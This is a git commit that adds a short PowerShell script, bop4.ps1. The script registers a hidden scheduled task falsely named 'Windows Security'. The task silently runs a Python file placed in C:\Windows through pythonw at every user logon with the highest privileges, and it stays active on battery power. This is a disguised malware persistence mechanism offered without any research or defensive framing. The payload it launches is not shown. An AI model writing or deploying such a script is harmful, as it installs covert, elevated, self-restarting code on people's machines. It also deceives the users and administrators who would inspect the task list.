739638538f3f145cca68ffa8a6bfe420faeadfc6
BobbyTech01 <71655475+BobbyTech01@users.noreply.github.com>
2026-01-03 23:55:34 -0800

    Add files via upload

---
+++ bop4.ps1
@@ -0,0 +1,27 @@
+$TaskName = "Windows Security"
+$FilePath = "C:\Windows\Config_.py"
+$PythonWPath = (Get-Command pythonw).Path
+$Action = New-ScheduledTaskAction -Execute $PythonWPath -Argument $FilePath
+
+# Trigger at log on of any user
+$Trigger = New-ScheduledTaskTrigger -AtLogOn
+
+$Settings = New-ScheduledTaskSettingsSet -Hidden
+
+# Use the current user's credentials
+$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
+
+# Create the scheduled task
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force
+
+# Get the scheduled task object
+$Task = Get-ScheduledTask -TaskName $TaskName
+
+# Disable the "Start the task only if the computer is on AC power" condition
+$Task.Settings.DisallowStartIfOnBatteries = $false
+
+# Set the task to hidden
+$Task.Settings.Hidden = $true
+
+# Update the task using the -InputObject parameter
+Set-ScheduledTask -InputObject $Task
